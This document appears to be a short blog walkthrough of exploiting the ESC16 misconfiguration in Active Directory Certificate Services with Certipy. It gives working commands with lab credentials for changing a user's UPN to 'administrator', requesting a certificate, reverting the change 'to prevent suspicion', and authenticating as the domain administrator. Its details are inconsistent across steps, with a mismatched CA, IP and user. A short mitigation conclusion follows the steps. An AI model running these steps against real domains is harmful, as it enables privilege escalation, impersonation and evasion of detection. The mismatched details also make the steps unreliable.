# Exploitation of ESC16 Vulnerability Using Certipy

#### Step 1: Update UserPrincipalName (UPN) of `martin`

Using the credentials of user `jcharles`, we update martin `userPrincipalName`to impersonate another user (`administrator`):

```ruby
certipy account -u 'jcharles' -p 'complex1@' -target 'furious.local' -upn 'administrator' -user 'martin' update
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*KpSLeMAJZvzJrvraM4zlxw.png)

- his modifies the `userPrincipalName` attribute for `jcharles` to `administrator`.
- Allows `jcharles` to request certificates for the `administrator` identity.

#### Step 2: Verify the Attribute Update

```ruby
certipy-ad account -u 'jcharles' -p 'complex1@' -dc-ip 192.168.129.140 -user 'martin' read
```


![](https://miro.medium.com/v2/resize:fit:1400/1*hJ_T_KjgPkCTbZwVP0N6tw.png)

Confirms `userPrincipalName` is now set to `administrator`.

Step 3: Request Certificate as `administrator`

```ruby
certipy-ad req -u '{usuario}@{dominio}' -p {password} --dc-ip 10.129.39.241 -target-ip 10.129.39.241 -ca 'fluffy-DC01-CA' -template 'User'
```


![](https://miro.medium.com/v2/resize:fit:1400/1*BhOQKQ3jtYbm4ldMfEpfvA.png)

Step 4: Revert the UPN Change

```ruby
certipy account -u '{usuario}' -p '{password}' -target '{dominio}' -upn '{martin}' -user 'martin' update
```

Reverts `userPrincipalName` back to prevent suspicion or disruption.


![](https://miro.medium.com/v2/resize:fit:1400/1*KW5KzaNr1YjAG5fSsVwn9g.png)

Step 5: Authenticate Using the Stolen Certificate

```ruby
certipy auth -pfx administrator.pfx -domain furious.local -dc-ip 192.168.129.140
```


![](https://miro.medium.com/v2/resize:fit:1400/1*Fe3yzY59QQQydo_VPU4rpg.png)

**Conclusion**

The ESC16 vulnerability in Active Directory Certificate Services (AD CS) arises when the `szOID_NTDS_CA_SECURITY_EXT` extension is globally disabled, weakening the certificate-to-account binding and allowing legacy mappings like UPN or SAN to be used for authentication. This misconfiguration, combined with the absence of strict enforcement (`StrongCertificateBindingEnforcement` not set to 2), enables attackers with limited privileges to impersonate higher-privileged users by modifying their own `userPrincipalName` and requesting a forged certificate. Through tools like Certipy, attackers can identify and exploit this flaw to gain unauthorized access. To prevent such attacks, organizations must ensure strong certificate binding enforcement is enabled, the critical OID extension is not disabled, and certificate templates and user permissions are strictly audited and configured.
